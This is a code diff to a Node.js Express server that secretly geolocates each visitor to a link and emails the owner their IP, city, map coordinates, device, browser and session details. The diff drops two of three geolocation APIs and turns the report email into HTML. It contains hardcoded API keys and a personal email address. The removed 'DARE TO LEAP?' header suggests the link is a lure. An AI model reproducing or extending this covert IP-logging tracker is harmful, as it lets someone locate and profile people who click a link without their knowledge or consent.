@@ -1,5 +1,3 @@
-// DARE TO LEAP?
-
 const express = require('express');
 const nodemailer = require('nodemailer');
 const axios = require('axios');
@@ -29,18 +27,11 @@ app.get('/', async (req, res) => {
   const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const userAgent = req.headers['user-agent'] || '';
   const referrer = req.headers['referer'] || 'direct';
-  
+
   const timestamp = new Date();
-  const formattedTimestamp = timestamp.toLocaleString('en-US', {
-    weekday: 'long',
-    year: 'numeric',
-    month: 'long',
-    day: 'numeric',
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit',
-    hour12: true,
-  });
+  const day = timestamp.toLocaleString('en-US', { weekday: 'long' });
+  const date = timestamp.toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+  const time = timestamp.toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
 
   if (userAgent.includes('UptimeRobot')) {
     return res.status(204).end();
@@ -58,29 +49,9 @@ app.get('/', async (req, res) => {
   const sessionStart = sessionStarts[ip];
   const sessionDuration = sessionStart ? `${(new Date() - sessionStart) / 1000} seconds` : 'First visit';
 
-  let location_ipdata = 'N/A';
-  let lat_ipdata = null;
-  let lon_ipdata = null;
-
   let location_ipinfo = 'N/A';
   let lat_ipinfo = null;
   let lon_ipinfo = null;
-
-  let location_opencage = 'N/A';
-  let lat_opencage = null;
-  let lon_opencage = null;
-
-  try {
-    const ipdataKey = '4c79ad3a83ad02e351dda5314f32ea361724437d091ce1501228965a';
-    const geo = await axios.get(`https://api.ipdata.co/${ip}?api-key=${ipdataKey}`);
-    const { city, region, country_name, organisation, latitude, longitude } = geo.data;
-
-    location_ipdata = `${city}, ${region}, ${country_name} (ISP: ${organisation})`;
-    lat_ipdata = latitude;
-    lon_ipdata = longitude;
-  } catch (err) {
-    console.warn('IPData failed:', err.message);
-  }
 
   try {
     const ipinfoToken = '5cbabbc7ad7b57';
@@ -96,68 +67,84 @@ app.get('/', async (req, res) => {
     console.warn('IPInfo failed:', err.message);
   }
 
-  try {
-    const openCageKey = 'cd07cd206f6a4f7086bed7fa65741f82';
-    const lat = lat_ipdata || lat_ipinfo;
-    const lon = lon_ipdata || lon_ipinfo;
-
-    if (lat && lon) {
-      const reverseGeo = await axios.get(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}`);
-      const result = reverseGeo.data.results[0];
-      location_opencage = result?.formatted || 'N/A';
-      lat_opencage = result?.geometry?.lat;
-      lon_opencage = result?.geometry?.lng;
-    }
-  } catch (err) {
-    console.warn('OpenCage failed:', err.message);
-  }
-
   const mailOptions = {
     from: 'zyron',
     to: 'xraymundzyron@gmail.com',
     subject: 'Visitor accessed your URL',
-    text: `New visit detected!
-
-Timestamp: ${formattedTimestamp}
-IP Address: ${ip}
-
-== LOCATION SOURCES ==
-[IPData]
-Location: ${location_ipdata}
-Coords: ${lat_ipdata}, ${lon_ipdata}
-Map: https://www.google.com/maps?q=${lat_ipdata},${lon_ipdata}
-
-[IPInfo]
-Location: ${location_ipinfo}
-Coords: ${lat_ipinfo}, ${lon_ipinfo}
-Map: https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}
-
-[OpenCage]
-Address: ${location_opencage}
-Coords: ${lat_opencage}, ${lon_opencage}
-Map: https://www.google.com/maps?q=${lat_opencage},${lon_opencage}
-
-== DEVICE INFO ==
-Device Type: ${deviceType}
-Brand:       ${device.vendor || 'Unknown'}
-Model:       ${device.model || 'Unknown'}
-OS:          ${os.name || 'OS'} ${os.version || ''}
-Browser:     ${browser.name || 'Browser'} ${browser.version || ''}
-Engine:      ${engine.name || 'Unknown engine'}
-CPU:         ${cpu.architecture || 'Unknown CPU architecture'}
-
-== SESSION ==
-Connection:       ${connectionType}
-Session Duration: ${sessionDuration}
-User Agent:       ${userAgent}
-Referrer:         ${referrer}`
+    html: `
+      <html>
+        <head>
+          <style>
+            body {
+              font-family: Arial, sans-serif;
+              background-color: #f4f4f4;
+              color: #333;
+              margin: 0;
+              padding: 0;
+            }
+            h1, h2 {
+              color: #007bff;
+            }
+            .section {
+              margin: 20px 0;
+              padding: 10px;
+              background-color: #fff;
+              border: 1px solid #ddd;
+              border-radius: 5px;
+            }
+            .timestamp, .location, .device-info, .session-info {
+              padding: 10px;
+            }
+            .map-link {
+              color: #007bff;
+              text-decoration: none;
+            }
+            .map-link:hover {
+              text-decoration: underline;
+            }
+          </style>
+        </head>
+        <body>
+          <h1>New Visit Detected!</h1>
+          <div class="section timestamp">
+            <h2>Timestamp</h2>
+            <p><strong>Day:</strong> ${day}</p>
+            <p><strong>Date:</strong> ${date}</p>
+            <p><strong>Time:</strong> ${time}</p>
+          </div>
+          <div class="section location">
+            <h2>Location</h2>
+            <p><strong>Location:</strong> ${location_ipinfo}</p>
+            <p><strong>Coordinates:</strong> ${lat_ipinfo}, ${lon_ipinfo}</p>
+            <p><a href="https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}" class="map-link" target="_blank">View on Google Maps</a></p>
+          </div>
+          <div class="section device-info">
+            <h2>Device Information</h2>
+            <p><strong>Device Type:</strong> ${deviceType}</p>
+            <p><strong>Brand:</strong> ${device.vendor || 'Unknown'}</p>
+            <p><strong>Model:</strong> ${device.model || 'Unknown'}</p>
+            <p><strong>OS:</strong> ${os.name || 'OS'} ${os.version || ''}</p>
+            <p><strong>Browser:</strong> ${browser.name || 'Browser'} ${browser.version || ''}</p>
+            <p><strong>Engine:</strong> ${engine.name || 'Unknown engine'}</p>
+            <p><strong>CPU:</strong> ${cpu.architecture || 'Unknown CPU architecture'}</p>
+          </div>
+          <div class="section session-info">
+            <h2>Session Information</h2>
+            <p><strong>Connection:</strong> ${connectionType}</p>
+            <p><strong>Session Duration:</strong> ${sessionDuration}</p>
+            <p><strong>User Agent:</strong> ${userAgent}</p>
+            <p><strong>Referrer:</strong> ${referrer}</p>
+          </div>
+        </body>
+      </html>
+    `
   };
 
   transporter.sendMail(mailOptions, (error) => {
     if (error) console.error('Email failed:', error);
   });
 
-  res.sendFile(__dirname + '/index.html');
+  res.send('Request received, email sent!');
 });
 
 function inferConnectionType(req) {
